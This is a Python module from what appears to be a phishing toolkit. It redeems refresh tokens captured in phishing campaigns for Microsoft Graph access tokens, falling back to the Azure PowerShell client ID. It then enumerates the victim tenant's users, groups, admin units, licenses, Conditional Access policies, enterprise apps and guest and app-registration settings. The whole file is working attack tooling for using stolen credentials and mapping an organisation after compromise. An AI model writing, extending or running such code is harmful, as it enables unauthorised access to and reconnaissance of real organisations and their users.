"""Live Microsoft Entra ID enumeration via Graph API using captured refresh tokens."""
from urllib.parse import urlparse

import requests

from app.services import get_access_token_from_refresh
from app.identity import jwt_scope_claims

# Fallback when the capture campaign has no public_client_id configured
FALLBACK_ENUM_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
FALLBACK_ENUM_CLIENT_NAME = "Microsoft Azure PowerShell"
DEFAULT_ENUM_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile email"
GRAPH_BASE = "https://graph.microsoft.com/v1.0"


def _client_display_name(client_id: str) -> str:
    if not client_id:
        return "Not configured"
    try:
        from app.resourses.app_to_all_list import client_list
        for entry in client_list:
            if entry.get("id", "").lower() == client_id.lower():
                return entry.get("name") or client_id
    except Exception:
        pass
    return client_id


def resolve_enum_client(captured_token_id, client_id_override=None):
    """Prefer the campaign phishing client_id; optional override; then fallback."""
    from app.models import CapturedToken

    token = CapturedToken.query.get(captured_token_id)
    if not token:
        raise ValueError("Token not found")

    campaign_client = ""
    session = token.session
    if session and session.campaign:
        campaign_client = (session.campaign.public_client_id or "").strip()

    if client_id_override is not None and str(client_id_override).strip():
        effective = str(client_id_override).strip()
    else:
        effective = campaign_client or FALLBACK_ENUM_CLIENT_ID

    return effective, _client_display_name(effective)


def resolve_enum_token_scopes(captured_token_id, client_id_override=None):
    """Refresh Graph access token and return JWT scp / roles from the phishing client."""
    from app.models import CapturedToken

    client_id, _ = resolve_enum_client(captured_token_id, client_id_override)
    token = CapturedToken.query.get(captured_token_id)

    access_token = None
    error = None
    token_data, refresh_err = get_access_token_from_refresh(
        captured_token_id,
        scope=DEFAULT_ENUM_SCOPE,
        client_id=client_id,
    )
    if token_data and token_data.get("access_token"):
        access_token = token_data.get("access_token")
    elif token and token.access_token:
        access_token = token.access_token
        if refresh_err:
            error = refresh_err
    elif refresh_err:
        error = refresh_err

    if not access_token:
        return {
            "scp": "",
            "scopes": [],
            "roles": [],
            "aud": "",
            "exp": None,
            "error": error or "Could not obtain access token",
        }

    info = jwt_scope_claims(access_token)
    info["error"] = error
    return info


ENTRA_SECTIONS = [
    {
        "id": "users",
        "label": "Users",
        "path": "/users",
        "params": {
            "$top": "100",
            "$select": "id,displayName,userPrincipalName,mail,userType,accountEnabled",
        },
        "columns": [
            {"key": "displayName", "label": "Display name"},
            {"key": "userPrincipalName", "label": "UPN"},
            {"key": "mail", "label": "Mail"},
            {"key": "userType", "label": "Type"},
            {"key": "accountEnabled", "label": "Enabled"},
            {"key": "id", "label": "Object ID"},
        ],
    },
    {
        "id": "groups",
        "label": "Groups",
        "path": "/groups",
        "params": {
            "$top": "100",
            "$select": "id,displayName,mail,mailEnabled,securityEnabled,groupTypes",
        },
        "columns": [
            {"key": "displayName", "label": "Display name"},
            {"key": "mail", "label": "Mail"},
            {"key": "groupTypes", "label": "Group types"},
            {"key": "securityEnabled", "label": "Security"},
            {"key": "id", "label": "Object ID"},
        ],
    },
    {
        "id": "administrative-units",
        "label": "Administrative units",
        "path": "/directory/administrativeUnits",
        "params": {
            "$top": "100",
            "$select": "id,displayName,description",
        },
        "columns": [
            {"key": "displayName", "label": "Display name"},
            {"key": "description", "label": "Description"},
            {"key": "id", "label": "Object ID"},
        ],
    },
    {
        "id": "licenses",
        "label": "Licenses",
        "path": "/subscribedSkus",
        "params": {},
        "columns": [
            {"key": "skuPartNumber", "label": "SKU"},
            {"key": "capabilityStatus", "label": "Status"},
            {"key": "consumedUnits", "label": "Consumed"},
            {"key": "enabledUnits", "label": "Enabled"},
            {"key": "id", "label": "SKU ID"},
        ],
    },
    {
        "id": "conditional-access",
        "label": "Conditional Access policies",
        "path": "/identity/conditionalAccess/policies",
        "params": {
            "$top": "100",
            "$select": "id,displayName,state,createdDateTime,modifiedDateTime",
        },
        "columns": [
            {"key": "displayName", "label": "Name"},
            {"key": "state", "label": "State"},
            {"key": "createdDateTime", "label": "Created"},
            {"key": "modifiedDateTime", "label": "Modified"},
            {"key": "id", "label": "Policy ID"},
        ],
    },
    {
        "id": "enterprise-apps",
        "label": "Enterprise apps",
        "path": "/servicePrincipals",
        "params": {
            "$top": "100",
            "$select": "id,displayName,appId,accountEnabled,servicePrincipalType,appOwnerOrganizationId",
        },
        "columns": [
            {"key": "displayName", "label": "Display name"},
            {"key": "appId", "label": "App ID"},
            {"key": "servicePrincipalType", "label": "Type"},
            {"key": "accountEnabled", "label": "Enabled"},
            {"key": "id", "label": "Object ID"},
        ],
    },
    {
        "id": "security-configuration",
        "label": "Security configuration",
        "kind": "settings",
        "columns": [
            {"key": "setting", "label": "Setting"},
            {"key": "value", "label": "Status"},
            {"key": "detail", "label": "Details"},
        ],
    },
]

_SECTION_BY_ID = {s["id"]: s for s in ENTRA_SECTIONS}

# Sections where Graph returns reliable @odata.count with ConsistencyLevel: eventual
_COUNT_SUPPORTED = {
    "users",
    "groups",
    "administrative-units",
    "enterprise-apps",
}


def _section_config(section_id: str):
    cfg = _SECTION_BY_ID.get(section_id)
    if not cfg:
        raise ValueError(f"Unknown enumeration section: {section_id}")
    return cfg


def _is_safe_graph_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
    except Exception:
        return False
    return parsed.scheme == "https" and parsed.netloc == "graph.microsoft.com"


def _format_cell(value):
    if value is None:
        return "-"
    if isinstance(value, bool):
        return "Yes" if value else "No"
    if isinstance(value, list):
        return ", ".join(str(v) for v in value) if value else "-"
    if isinstance(value, dict):
        if "enabled" in value:
            return str(value.get("enabled", "-"))
        return str(value)
    return str(value)


def _normalize_row(item: dict, section_id: str) -> dict:
    row = dict(item)
    if section_id == "licenses":
        prepaid = item.get("prepaidUnits") or {}
        row["enabledUnits"] = prepaid.get("enabled")
    return row


def _format_allow_invites_from(value) -> str:
    mapping = {
        "everyone": "Everyone (including guests) can invite guests",
        "adminsAndGuestInvitersAndAllMembers": "Admins, guest inviters, and all members can invite",
        "adminsAndGuestInviters": "Only admins and users assigned the Guest Inviter role",
        "none": "No one can invite guests",
    }
    key = (value or "").strip()
    return mapping.get(key, key or "Unknown")


def _fetch_authorization_policy(access_token: str) -> dict:
    resp = requests.get(
        f"{GRAPH_BASE}/policies/authorizationPolicy",
        headers=_graph_headers(access_token),
        timeout=45,
    )
    if resp.status_code >= 400:
        try:
            body = resp.json()
            msg = body.get("error", {}).get("message") or body.get("error_description") or resp.text
        except Exception:
            msg = resp.text or f"Graph API error {resp.status_code}"
        raise RuntimeError(msg)
    return resp.json()


def _security_configuration_rows(policy: dict) -> list:
    allow_invites = policy.get("allowInvitesFrom")
    perms = policy.get("defaultUserRolePermissions") or {}
    allowed_apps = perms.get("allowedToCreateApps")

    guest_invite_by_all = (allow_invites or "").strip().lower() == "everyone"

    return [
        {
            "setting": "Guest invites allowed by everyone",
            "value": "Yes" if guest_invite_by_all else "No",
            "detail": _format_allow_invites_from(allow_invites),
        },
        {
            "setting": "Users can register applications",
            "value": _format_cell(allowed_apps),
            "detail": (
                "defaultUserRolePermissions.allowedToCreateApps = true"
                if allowed_apps is True
                else "defaultUserRolePermissions.allowedToCreateApps = false"
                if allowed_apps is False
                else "Not returned by Graph"
            ),
        },
    ]


def _enum_access_token_override(access_token_override):
    token = (access_token_override or "").strip()
    return token or None


def fetch_security_configuration(captured_token_id, client_id=None, access_token_override=None):
    """Fetch tenant security configuration settings from authorization policy."""
    cfg = _section_config("security-configuration")
    override = _enum_access_token_override(access_token_override)

    if override:
        access_token = override
        effective_client, client_name = resolve_enum_client(captured_token_id, client_id)
    else:
        access_token, effective_client, client_name, err = _get_enum_access_token(
            captured_token_id, client_id
        )
        if err:
            return None, err

    if not access_token:
        return None, "No access token available"

    try:
        policy = _fetch_authorization_policy(access_token)
    except requests.RequestException as exc:
        return None, str(exc)
    except RuntimeError as exc:
        return None, str(exc)

    rows = _security_configuration_rows(policy)
    count = len(rows)

    return {
        "ok": True,
        "section": cfg["id"],
        "label": cfg["label"],
        "kind": "settings",
        "columns": cfg["columns"],
        "rows": rows,
        "count": count,
        "total_count": count,
        "next_link": None,
        "client_id": effective_client,
        "client_name": client_name,
        "scope": DEFAULT_ENUM_SCOPE,
        "token_source": "custom" if override else "refresh",
    }, None


def _get_enum_access_token(captured_token_id, client_id=None, scope=None):
    effective_client, client_name = resolve_enum_client(captured_token_id, client_id)
    token_data, err = get_access_token_from_refresh(
        captured_token_id,
        scope=scope or DEFAULT_ENUM_SCOPE,
        client_id=effective_client,
    )
    if err:
        return None, effective_client, client_name, err
    access_token = token_data.get("access_token") if token_data else None
    if not access_token:
        return None, effective_client, client_name, "No access token returned from refresh"
    return access_token, effective_client, client_name, None


def _graph_headers(access_token: str, *, include_count: bool = False) -> dict:
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json",
    }
    if include_count:
        headers["ConsistencyLevel"] = "eventual"
    return headers


def _parse_graph_count(payload: dict, page_len: int) -> int:
    odata_count = payload.get("@odata.count")
    if odata_count is not None:
        try:
            return int(odata_count)
        except (TypeError, ValueError):
            pass
    return page_len


def _fetch_section_total(access_token: str, cfg: dict) -> int:
    section_id = cfg["id"]
    if cfg.get("kind") == "settings":
        if section_id == "security-configuration":
            policy = _fetch_authorization_policy(access_token)
            return len(_security_configuration_rows(policy))
        return 0

    params = dict(cfg.get("params") or {})
    include_count = section_id in _COUNT_SUPPORTED
    if include_count:
        params["$count"] = "true"
        params["$top"] = "1"
    elif "$top" not in params:
        params["$top"] = "999"

    resp = requests.get(
        f"{GRAPH_BASE}{cfg['path']}",
        headers=_graph_headers(access_token, include_count=include_count),
        params=params,
        timeout=45,
    )
    if resp.status_code >= 400:
        try:
            body = resp.json()
            msg = body.get("error", {}).get("message") or body.get("error_description") or resp.text
        except Exception:
            msg = resp.text or f"Graph API error {resp.status_code}"
        raise RuntimeError(msg)
    payload = resp.json()
    values = payload.get("value", [])
    total = _parse_graph_count(payload, len(values))
    if payload.get("@odata.nextLink") and total <= len(values):
        return max(total, len(values))
    return total


def fetch_all_entra_counts(captured_token_id, client_id=None, access_token_override=None):
    """Return total object counts for every enumeration section."""
    override = _enum_access_token_override(access_token_override)
    if override:
        access_token = override
        effective_client, client_name = resolve_enum_client(captured_token_id, client_id)
    else:
        access_token, effective_client, client_name, err = _get_enum_access_token(
            captured_token_id, client_id
        )
        if err:
            return None, err

    counts = {}
    errors = {}
    for section in ENTRA_SECTIONS:
        sid = section["id"]
        try:
            counts[sid] = _fetch_section_total(access_token, section)
        except Exception as exc:
            counts[sid] = None
            errors[sid] = str(exc)

    return {
        "ok": True,
        "counts": counts,
        "errors": errors,
        "client_id": effective_client,
        "client_name": client_name,
    }, None


def fetch_entra_section(
    captured_token_id,
    section_id,
    client_id=None,
    next_link=None,
    access_token_override=None,
):
    """Fetch one page of Entra data for a captured token. Returns dict for JSON API."""
    cfg = _section_config(section_id)
    override = _enum_access_token_override(access_token_override)
    if cfg.get("kind") == "settings":
        if next_link:
            return None, "Pagination is not supported for security configuration"
        return fetch_security_configuration(
            captured_token_id, client_id=client_id, access_token_override=override
        )

    if override:
        access_token = override
        effective_client, client_name = resolve_enum_client(captured_token_id, client_id)
        err = None
    else:
        access_token, effective_client, client_name, err = _get_enum_access_token(
            captured_token_id, client_id
        )
    if err:
        return None, err
    if not access_token:
        return None, "No access token available"

    include_count = section_id in _COUNT_SUPPORTED and not next_link

    if next_link:
        if not _is_safe_graph_url(next_link):
            return None, "Invalid pagination link"
        url = next_link
        params = None
    else:
        url = f"{GRAPH_BASE}{cfg['path']}"
        params = dict(cfg.get("params") or {})
        if include_count:
            params["$count"] = "true"

    headers = _graph_headers(access_token, include_count=include_count)

    try:
        if next_link:
            resp = requests.get(url, headers=headers, timeout=45)
        else:
            resp = requests.get(url, headers=headers, params=params, timeout=45)
        if resp.status_code >= 400:
            try:
                body = resp.json()
                msg = body.get("error", {}).get("message") or body.get("error_description") or resp.text
            except Exception:
                msg = resp.text or f"Graph API error {resp.status_code}"
            return None, msg
        payload = resp.json()
    except requests.RequestException as e:
        return None, str(e)

    values = payload.get("value", [])
    rows = []
    for item in values:
        normalized = _normalize_row(item, section_id)
        rows.append(
            {col["key"]: _format_cell(normalized.get(col["key"])) for col in cfg["columns"]}
        )

    page_count = len(rows)
    total_count = None
    if not next_link:
        if section_id in _COUNT_SUPPORTED:
            total_count = _parse_graph_count(payload, page_count)
        elif not payload.get("@odata.nextLink"):
            total_count = page_count

    return {
        "ok": True,
        "section": section_id,
        "label": cfg["label"],
        "columns": cfg["columns"],
        "rows": rows,
        "count": page_count,
        "total_count": total_count,
        "next_link": payload.get("@odata.nextLink"),
        "client_id": effective_client,
        "client_name": client_name,
        "scope": DEFAULT_ENUM_SCOPE,
        "token_source": "custom" if override else "refresh",
    }, None
